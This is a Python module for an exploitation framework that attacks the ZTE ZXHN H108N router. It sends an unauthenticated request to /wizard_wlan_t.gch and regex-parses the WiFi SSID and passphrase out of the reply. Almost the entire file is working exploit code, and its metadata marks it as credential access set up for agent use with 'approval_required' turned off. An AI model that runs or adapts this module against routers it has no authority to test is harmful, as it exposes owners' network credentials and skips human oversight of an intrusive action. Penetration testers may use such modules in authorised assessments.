#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZTE ZXHN H108N Wifi Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'ZTE ZXHN H108N Wifi Password Disclosure',
        'description': 'Module exploits ZTE ZXHN H108N WiFi Password Disclosure vulnerability that allows to retrieve password for wifi connection.',
        'author': ['Mostafa Nafady', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': [],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        credentials = self.get_credentials()
        if credentials:
            print_success("Target is vulnerable")

            ssid, password = credentials
            creds = [
                ("SSID Name", ssid),
                ("Password", password)
            ]

            print_status("Discovered information:")
            print_table(("Parameter", "Value"), *creds)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def get_credentials(self):
        response = self.http_request(
            method="GET",
            path="/wizard_wlan_t.gch"
        )

        if response:
            # get ssid
            ssid = ""
            password = ""

            res = [r for r in re.findall(r"Transfer_meaning\('ESSID','(.*?)'\);", response.text) if r]
            if res:
                ssid = res[0]

            # get password
            res = [r for r in re.findall(r"Transfer_meaning\('KeyPassphrase','(.*?)'\);", response.text) if r]
            if res:
                password = res[0]

            if ssid or password:
                return (ssid, password)

        return None
    def check(self):
        credentials = self.get_credentials()
        if credentials:
            return True  # target is vulnerable

        return False  # target is not vulnerable
